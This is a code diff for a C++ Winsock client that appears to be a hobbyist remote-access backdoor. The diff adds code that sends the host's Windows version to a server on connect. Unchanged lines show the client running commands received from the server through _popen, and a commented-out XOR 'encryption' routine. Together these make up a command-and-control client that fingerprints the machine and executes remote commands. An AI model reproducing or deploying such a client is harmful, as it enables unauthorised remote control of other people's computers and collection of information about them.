@@ -10,6 +10,7 @@
 #include <stdio.h>
 #include <string>
 #include <iostream>
+#include <VersionHelpers.h>
 
 #pragma comment(lib, "Ws2_32.lib")
 #pragma comment(lib, "Mswsock.lib")
@@ -111,12 +112,17 @@ int Socks::sendData(std::string msg) {
 	int result = 0;
 	std::string peaky = "enCRAPtion";
 	int peaky_len = peaky.length();
-
+	//send client information
 	if (msg == "") {
-		std::cout << "Enter Command: ";
-		std::cin >> msg;
+		//gets operating system version
+		if (!IsWindows8OrGreater()) {
+			msg = "Less than Windows 8";
+		}
+		else
+			msg = "Is Windows 8 or greater";
+
 	}
-	int msg_len = msg.length();
+	//sends server information about client
 	
 	//encryption
 	/*for (int i = 0, x = 0; i < msg_len; i++, x++) {
@@ -125,6 +131,7 @@ int Socks::sendData(std::string msg) {
 		}
 		msg[i] = msg[i] ^ peaky[x];
 	}*/
+	
 	result = send(ConnectSocket, msg.c_str(), msg.length(), 0);
 	if (result == SOCKET_ERROR) {
 		printf("send failed: %d\n", WSAGetLastError());
@@ -171,6 +178,7 @@ int Socks::recvData() {
 		//take address from captured response
 		char buffer[4000];
 		std::string data = "";
+		//runs a command 
 		FILE* _pipe = _popen(msg.c_str(), "r");
 
 		//redirects stdout to pipe and adds elements of buffer to result string
@@ -241,6 +249,7 @@ int main()
 		return 1;
 	}
 	freeaddrinfo(info);
+	socket.sendData("");
 	socket.recvData();
 	std::string nullstr;
 	//socket.sendData(nullstr);
